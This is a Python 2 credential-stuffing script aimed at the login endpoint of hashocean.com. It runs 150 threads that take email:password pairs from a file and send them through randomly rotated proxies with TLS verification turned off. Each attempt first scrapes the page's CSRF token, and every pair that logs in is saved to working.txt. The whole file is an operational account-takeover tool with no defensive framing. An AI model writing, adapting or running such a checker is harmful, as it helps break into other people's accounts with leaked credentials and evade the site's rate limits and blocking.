# -*- coding: utf-8 -*-
import requests
import re
import Queue
import codecs
import random
from threading import Thread

requests.packages.urllib3.disable_warnings()

with codecs.open('proxies.txt', 'r', encoding='utf-8') as f:
    proxies = f.readlines()

def check(q):
    while True:
        try:
            c = q.get()
            user = c.split(':')[0]
            passw = c.split(':')[1]
            work = False
            s = requests.session()
            proxy = random.choice(proxies).strip()
            prozy = {
                'http': proxy,
                'https': proxy
            }
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36',
                'Accept-Encoding': 'gzip',
                'Accept': 'application/json, text/plain, */*'
            }
            r = s.get(
                        'https://hashocean.com/login/',
                        verify=False,
                        timeout=10,
                        proxies=prozy,
                        headers=headers
                    )
            token = re.findall('security_token" autocomplete="off" value="\' \+ \'(.*?)\'', r.text)[0]
            headers['X-Requested-With'] = 'XMLHttpRequest'
            headers['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
            r = s.post(
                        'https://hashocean.com/login/',
                        'ajax=1&module=registration&action=login&security_token={0}&email={1}&password={2}'.format(token, user, passw),
                        verify=False,
                        proxies=prozy,
                        timeout=10,
                        headers=headers
                    )
            if 'success":true' in r.text:
                work = True
            if work:
                f = open("working.txt", "a")
                f.write('{0}:{1}\n'.format(user, passw))
                f.close()
                print user, 'works!'
            else:
                print user, 'does not work!'
            q.task_done()
        except Exception, e:
            proxy = random.choice(proxies)
    
def main():
    with codecs.open('accounts.txt', 'r', encoding='utf-8') as f:
        users = f.readlines()
        
    queue = Queue.Queue()
    
    for _ in range(int(150)):
        worker = Thread(target=check, args=(queue,))
        worker.start()
    for user in users:
        queue.put(user.strip().encode('ascii', 'ignore'))
            
if __name__ == '__main__':
    main()